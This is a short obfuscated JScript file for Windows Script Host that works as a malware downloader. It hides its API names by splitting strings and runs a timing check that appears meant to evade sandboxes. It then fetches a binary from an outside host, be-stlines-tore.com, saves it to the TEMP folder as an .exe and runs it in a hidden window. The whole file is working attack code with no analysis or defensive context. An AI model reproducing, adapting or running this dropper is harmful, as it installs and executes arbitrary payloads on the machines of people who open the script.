var U1 = false;
var U = "Create"+"Object";
var M1 = function GH() {return WScript[U]("WScript"+".Shell");}(), VS = 11;
var L = "MSXML2"+".XMLHTTP";
var N = 2;
var Q = N - 2;
function R(E){M1["Run"](E, Q, Q);};
function M(){return L + "";};
function S(O0, PJ){Q = Q * 1; return O0 - PJ;};
function SV(){return U;};
/*@cc_on
  @if (@_win32 || @_win64)
    U1 = true;
  @end
@*/
if (U1)
{
var Y = "";
function MM(){return 22;};
var TD = 0; var A0 = 0;
function MG()
{
var Z0 = new this["Date"]();
var FZ = Z0["getUTCMilliseconds"]();
WScript["Sleep"](MM());
var Z0 = new this["Date"]();
var A = Z0["getUTCMilliseconds"]();
WScript["Sleep"](MM());
var Z0 = new this["Date"]();
var VO = Z0["getUTCMilliseconds"]();
var TD = "R0";
TD = S(A, FZ);
var A0 = "J";
A0 = S(VO, A);
Y = "open";
return S(TD, A0);
}
var U0 = false;
var CH = false;
for (var YT = Q; YT < MM() * 1; YT++){if (MG() != Q){
U0 = true; 
A0 = "31" + 11 * TD + A0; 
CH = true; 
break;
}}
function QE() {return ((U0 == true) && (U0 == CH)) ? 1 : Q;};
if (U0 && QE() && CH){
function XO() {return M1["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "nts8JrYLm.ex" + "e";};
 IM = M();
 Y0 = WScript[U](IM);
 var O = 1;
do { 
	for (;O;){
	try {
		if (O == 1)
		{
			Y0[Y]("GET", "http://be-stlines-tore.com/u3rsap", false);
			Y0["send"]();
			T = "Sleep";
			O = 2;
		}
		WScript[T](MM() + 120); 
		if (Y0["readystate"] < 2 * 2) continue;
		O = Q;
		function ZY(M0) {var LC = (1, 2, 3, 4, 5, M0); return LC;};
		M2 = WScript[SV()]("ADODB.Stream");
		IM = M2;
		IM[Y]();
		IM["type"] = ZY(1);
		IM["write"](Y0["ResponseBody"]);
		M2["position"] = ZY(Q);
		IM["Save" + "ToFile"](XO(), 2);
		M2["cl"+"ose"]();
		Z = XO();
		R(Z);
	} catch(R1){};};
}while (O);
}
}

